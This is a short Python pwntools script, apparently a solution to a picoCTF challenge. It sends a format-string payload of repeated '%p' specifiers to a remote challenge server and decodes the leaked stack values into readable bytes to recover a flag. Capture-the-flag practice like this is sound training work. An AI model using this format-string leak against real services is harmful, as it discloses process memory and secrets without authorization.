import pwn

io = pwn.remote("mimas.picoctf.net", 49231)

io.sendline(b".%p"*40)
io.recvline()

line = io.recvline()
addresses = line.decode().split(".")
for address in addresses:
    if address.startswith("0x") and len(address) % 2 == 0:
        io.info(bytes.fromhex(address[2:])[::-1])

io.info(io.recvall())
